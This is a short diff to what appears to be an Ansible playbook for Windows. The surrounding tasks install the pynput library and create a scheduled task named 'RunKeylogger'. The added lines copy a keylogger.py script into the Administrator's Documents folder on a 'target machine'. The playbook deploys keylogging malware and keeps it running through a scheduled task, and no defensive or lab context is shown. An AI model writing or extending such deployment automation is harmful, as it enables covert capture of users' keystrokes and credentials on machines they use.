@@ -2,6 +2,11 @@
     - name: Install pynput using pip
       win_command: C:\Python312\Scripts\pip.exe install pynput
 
+    - name: Copy Keylogger script to the target machine
+      win_copy:
+        src: ~/keylogger.py
+        dest: C:\Users\Administrator\Documents\keylogger.py
+
     - name: Create a scheduled task to run the keylogger
       win_scheduled_task:
         name: "RunKeylogger"
